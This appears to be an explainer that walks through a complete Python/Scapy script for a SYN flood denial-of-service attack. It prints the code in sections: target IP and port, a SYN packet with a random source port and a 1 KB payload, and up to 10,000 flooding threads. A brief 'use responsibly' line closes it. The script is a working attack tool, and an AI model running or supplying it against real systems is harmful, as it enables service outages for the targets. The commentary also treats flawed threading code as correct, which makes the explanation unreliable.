This Python script sends a continuous stream of SYN packets to a target IP and port, aiming to overwhelm the target in what is known as a SYN flood attack. The code uses Scapy to create packets and Python’s `threading` module to send these packets in parallel. Let’s break down the code:

### 1. Importing Modules

```python
from scapy.all import *
import threading
```

The `scapy.all` import brings in all Scapy’s networking and packet-building capabilities. `threading` is imported to handle concurrent sending of packets, making the flood more intense.

### 2. Defining Target Parameters

```python
target_ip = "192.168.1.1"  # Target IP address
target_port = 80           # Target port
```

`target_ip` and `target_port` define the destination IP and port that will receive the flood.

### 3. Constructing the Packet Layers

```python
ip = IP(dst=target_ip)  
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
```

Here’s how the packet is constructed:
   - **IP Layer**: `IP(dst=target_ip)` specifies the destination IP.
   - **TCP Layer**: `TCP(sport=RandShort(), dport=target_port, flags="S")` creates a SYN packet. The `RandShort()` function randomizes the source port, while `flags="S"` sets the SYN flag.
   - **Payload**: `Raw(b"X"*1024)` adds 1 KB of dummy data as payload, which isn't necessary for a SYN flood but increases data transfer.
   - **Complete Packet**: `p = ip / tcp / raw` combines the layers into a complete packet (`p`).

### 4. Threaded Packet Sending

```python
thread_list = list()
def envoyer(p):
    send(p, loop=1, verbose=0)
```

   - **Thread List**: `thread_list` will store each thread for later synchronization.
   - **Sending Function**: `envoyer(p)` is the function each thread will execute. It continuously sends the packet `p` in an infinite loop due to `loop=1`.

### 5. Launching the Threads

```python
for _ in range(1,10000):
    try:    
        flood = threading.Thread(target=envoyer, args=(p))
        thread_list.append(flood)
        flood.daemon = True
        flood.start()
        for flood in thread_list:
            flood.join()
    except:
        print("Something went wrong!")
```

   - **Loop for Thread Creation**: The loop tries to create 10,000 threads.
   - **Daemon Threads**: Each thread is set to daemon mode, meaning they’ll terminate automatically if the main program ends.
   - **Start and Join Threads**: Each thread is started immediately, then `flood.join()` ensures the main program waits until all threads finish.
   - **Error Handling**: If something goes wrong (e.g., if there are too many threads or network issues), it will print `"Something went wrong!"`.

### Summary
This script performs a SYN flood by creating numerous threads, each sending packets to the target. Each packet has a randomized source port, the SYN flag set, and an additional 1 KB of data. The high volume of packets aims to exhaust the target’s resources, which can result in a denial of service if successful. However, this code should be used responsibly and only on networks and systems you own or have permission to test.
